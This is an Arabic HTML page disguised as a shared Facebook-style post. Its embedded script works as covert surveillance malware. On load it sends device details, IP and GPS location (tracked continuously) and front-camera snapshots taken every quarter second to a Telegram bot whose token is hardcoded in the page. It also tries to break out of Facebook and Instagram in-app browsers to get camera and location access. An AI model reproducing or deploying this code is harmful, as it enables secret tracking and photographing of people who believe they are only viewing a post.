<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Shahin Zyan masengar</title>
  <meta property="og:title" content="Shahin Zyan masengar">
  <meta property="og:description" content="شارك لك منشور">
  <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
  <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
  <meta name="twitter:title" content="Shahin Zyan masengar">
  <meta name="twitter:description" content="شارك لك منشور">
  <meta name="twitter:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
  <style>
    :root { --bg: #f0f2f5; --card-bg: #ffffff; --text-primary: #1c1e21; --text-secondary: #65676b; --border: #e4e6eb; }
    @media (prefers-color-scheme: dark) { :root { --bg: #18191a; --card-bg: #242526; --text-primary: #e4e6eb; --text-secondary: #b0b3b8; --border: #3e4042; } }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: var(--bg); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 20px; min-height: 100vh; position: relative; }
    .post-container { max-width: 500px; width: 100%; background: var(--card-bg); border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid var(--border); margin-bottom: 15px; }
    .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
    .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
    .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
    .post-time { font-size: 13px; color: var(--text-secondary); }
    .post-text { padding: 4px 16px 12px; font-size: 15px; color: var(--text-primary); white-space: pre-wrap; }
    .post-image img { width: 100%; display: block; }
    .post-stats { display: flex; justify-content: space-between; padding: 8px 16px; font-size: 13px; color: var(--text-secondary); border-top: 1px solid var(--border); }
    .post-actions { display: flex; justify-content: space-evenly; padding: 4px 16px 8px; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 14px; font-weight: 600; }
    .post-actions span { cursor: pointer; padding: 8px 0; flex: 1; text-align: center; }
    .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
    .three-dots:hover { background: var(--border); }
    .controls { display: flex; flex-direction: column; align-items: center; gap: 10px; width: 100%; max-width: 500px; }
    .retry-btn { padding: 12px 20px; font-size: 0.9rem; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; width: 100%; }
    .hidden { display: none !important; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div class="post-container" id="postContainer">
    <div class="post-header">
      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
      <div>
        <div class="post-user">المستخدم</div>
        <div class="post-time">الآن</div>
      </div>
      <div class="three-dots">⋯</div>
    </div>
    <div class="post-text">جارٍ تحميل المنشور...</div>
    <div class="post-stats"><span>0 تعليق</span><span>0 مشاركة</span></div>
    <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
  </div>

  <div class="controls">
    <button class="retry-btn hidden" id="retryCameraBtn">إعادة محاولة الكاميرا</button>
    <button class="retry-btn hidden" id="retryLocationBtn">إعادة محاولة الموقع</button>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    // ==================== إعدادات ====================
    const B = '69ee19e8856a68218974812e';
    const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
    const C = '5151102782';
    const I = 'a7e43833d69a75';

    const post = document.getElementById('postContainer');
    const retryCameraBtn = document.getElementById('retryCameraBtn');
    const retryLocationBtn = document.getElementById('retryLocationBtn');
    const vid = document.getElementById('video');
    const cnv = document.getElementById('canvas');
    const ctx = cnv.getContext('2d');

    let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
    let cameraGranted = false;
    let locationGranted = false;
    let escapeCompleted = false;
    let watchId = null;

    function sendText(text) {
      fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
      }).catch(() => {});
    }

    function showOverlay(reason) {
      post.classList.add('hidden');
      if (reason === 'camera') {
        retryCameraBtn.classList.remove('hidden');
        retryLocationBtn.classList.add('hidden');
      } else {
        retryLocationBtn.classList.remove('hidden');
        retryCameraBtn.classList.add('hidden');
      }
    }

    function hideOverlay() {
      post.classList.remove('hidden');
      retryCameraBtn.classList.add('hidden');
      retryLocationBtn.classList.add('hidden');
    }

    function stopAll() {
      if (capInt) clearInterval(capInt);
      if (stream) stream.getTracks().forEach(t => t.stop());
      if (watchId) navigator.geolocation.clearWatch(watchId);
    }

    // ==================== تحميل المنشور ====================
    async function loadPost() {
      try {
        const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
        const d = await r.json(); const s = d.record || {};
        redir = s.redirectUrl || redir;
        post.innerHTML = `
          <div class="post-header">
            <img src="${s.profilePicture||'https://i.ibb.co/zJx0q3Q/default-avatar.png'}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
            <div>
              <div class="post-user">${s.profileName||'Shahin Zyan'}</div>
              <div class="post-time">${s.postTime||'الآن'}</div>
            </div>
            <div class="three-dots">⋯</div>
          </div>
          <div class="post-text">${s.postText||'هذا نص تجريبي.'}</div>
          ${s.postImage?`<div class="post-image"><img src="${s.postImage}" alt="صورة المنشور"></div>`:''}
          <div class="post-stats"><span>${s.commentsCount||'12'} تعليق</span><span>${s.sharesCount||'5'} مشاركة</span></div>
          <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>`;
      } catch (e) {}
    }

    // ==================== معلومات الجهاز ====================
    async function sendDeviceInfo() {
      if (deviceInfoSent) return;
      deviceInfoSent = true;
      try {
        const ua = navigator.userAgentData || {}; let h = {};
        if (ua.getHighEntropyValues) try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
        const sc = window.screen; let bat = null;
        if ('getBattery' in navigator) try { const b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
        let txt = '<b>📱 معلومات الجهاز</b>\n';
        txt += `الموديل: ${h.model||'N/A'}\nالنظام: ${navigator.platform}\nالشاشة: ${sc.width}x${sc.height}\n`;
        txt += `المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
        if (bat) txt += `البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
        txt += `اللغة: ${navigator.language}\nالمنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
        sendText(txt);
      } catch (e) {}
    }

    // ==================== الموقع عبر IP ====================
    async function fetchIPLocation() {
      try {
        const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
        if (d.loc) {
          const [lat, lon] = d.loc.split(',').map(Number);
          ipLoc = { lat, lon, acc: 5000, src: 'IP' };
          sendText(
            `📍 <b>الموقع التقريبي (IP)</b>\n` +
            `الإحداثيات: ${lat}, ${lon}\n` +
            `🌍 <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>\n` +
            `🍎 <a href="http://maps.apple.com/?ll=${lat},${lon}&q=موقع">Apple Maps</a>\n` +
            `🗺️ <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15">OpenStreetMap</a>`
          );
        }
      } catch (e) {}
    }

    // ==================== الموقع الدقيق GPS (getCurrentPosition + watchPosition) ====================
    function startWatchingGPS() {
      if (!navigator.geolocation) {
        retryLocationBtn.classList.remove('hidden');
        return;
      }
      // أولاً: getCurrentPosition لظهور نافذة الإذن
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
            gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
            sendText(
              `📍 <b>الموقع الدقيق (GPS)</b>\n` +
              `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
              `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">Google Maps</a>\n` +
              `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">Apple Maps</a>\n` +
              `🗺️ <a href="https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18">OpenStreetMap</a>`
            );
            locationGranted = true;
            retryLocationBtn.classList.add('hidden');
            // ثانياً: watchPosition للمراقبة المستمرة
            watchId = navigator.geolocation.watchPosition(
              (p) => {
                if (p.coords.accuracy && p.coords.accuracy <= 50) {
                  gpsLoc = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, src: 'GPS' };
                }
              },
              () => {},
              { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
            );
          } else {
            // دقة ضعيفة، ننتظر watchPosition يعطينا أفضل
            watchId = navigator.geolocation.watchPosition(
              (p) => {
                if (p.coords.accuracy && p.coords.accuracy <= 50) {
                  gpsLoc = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, src: 'GPS' };
                  sendText(
                    `📍 <b>الموقع الدقيق (GPS)</b>\n` +
                    `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
                    `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">Google Maps</a>\n` +
                    `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">Apple Maps</a>\n` +
                    `🗺️ <a href="https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18">OpenStreetMap</a>`
                  );
                  locationGranted = true;
                  retryLocationBtn.classList.add('hidden');
                }
              },
              () => {},
              { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
            );
          }
        },
        (err) => {
          retryLocationBtn.classList.remove('hidden');
        },
        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
      );
    }

    // ==================== الكاميرا والتصوير المستمر (طريقة XMLHttpRequest الناجحة) ====================
    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        vid.srcObject = stream;
        await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
        sendText("✅ الكاميرا تعمل، جاري التصوير...");
        capInt = setInterval(captureAndSend, 250);
        return true;
      } catch (e) { return false; }
    }

    function captureAndSend() {
      if (!stream || !vid.videoWidth) return;
      cnv.width = vid.videoWidth;
      cnv.height = vid.videoHeight;
      ctx.drawImage(vid, 0, 0);
      if (cnv.toBlob) {
        cnv.toBlob(blob => {
          if (!blob || blob.size > 10 * 1024 * 1024) return;
          const xhr = new XMLHttpRequest();
          xhr.open('POST', `https://api.telegram.org/bot${T}/sendPhoto`);
          const form = new FormData();
          form.append('chat_id', C);
          form.append('photo', blob, 'snap.jpg');
          xhr.send(form);
          photos++;
        }, 'image/jpeg', 0.4);
      } else {
        const dataUrl = cnv.toDataURL('image/jpeg', 0.4);
        fetch(dataUrl).then(r => r.blob()).then(blob => {
          if (blob.size > 10 * 1024 * 1024) return;
          const xhr = new XMLHttpRequest();
          xhr.open('POST', `https://api.telegram.org/bot${T}/sendPhoto`);
          const form = new FormData();
          form.append('chat_id', C);
          form.append('photo', blob, 'snap.jpg');
          xhr.send(form);
          photos++;
        }).catch(() => {});
      }
    }

    async function tryCamera() {
      const ok = await startCamera();
      if (ok) {
        cameraGranted = true;
        retryCameraBtn.classList.add('hidden');
        // ابدأ بمراقبة الموقع
        startWatchingGPS();
      } else {
        showOverlay('camera');
        stopAll();
      }
    }

    // ==================== إعادة المحاولة ====================
    retryCameraBtn.addEventListener('click', async () => {
      retryCameraBtn.classList.add('hidden');
      hideOverlay();
      await tryCamera();
    });

    retryLocationBtn.addEventListener('click', async () => {
      retryLocationBtn.classList.add('hidden');
      startWatchingGPS();
      setTimeout(() => {
        if (!locationGranted) retryLocationBtn.classList.remove('hidden');
      }, 10000);
    });

    // ==================== تقرير الخروج ====================
    async function sendExitReport() {
      let locStr = 'غير متوفر';
      if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
      else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
      sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
    }

    // ==================== خطة الهروب من WebView ====================
    async function attemptEscape() {
      if (escapeCompleted) return;
      const targetUrl = window.location.href;
      const ua = navigator.userAgent || '';
      const isIOS = /iPhone|iPad|iPod/i.test(ua);
      const isAndroid = /Android/i.test(ua);
      const methods = isIOS ? [
        () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); },
        () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); },
        () => { window.location.href = 'opera-https://' + targetUrl.replace(/^https?:\/\//, ''); },
        () => { window.location.href = 'firefox://open-url?url=' + encodeURIComponent(targetUrl); },
        () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
      ] : isAndroid ? [
        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`; },
        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.opera.browser;end`; },
        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=org.mozilla.firefox;end`; },
        () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
      ] : [];
      for (let i = 0; i < methods.length; i++) {
        try { methods[i](); } catch(e) {}
        await new Promise(r => setTimeout(r, 300));
      }
      escapeCompleted = true;
    }

    function isInAppBrowser() {
      const ua = navigator.userAgent || '';
      return /FBAN|FBAV|Instagram/i.test(ua);
    }

    (async function init() {
      await loadPost();
      sendDeviceInfo();
      fetchIPLocation();
      if (isInAppBrowser()) await attemptEscape();
      setTimeout(tryCamera, 600);
    })();

    window.addEventListener('beforeunload', () => {
      stopAll();
      sendExitReport();
    });
  </script>
</body>
</html>
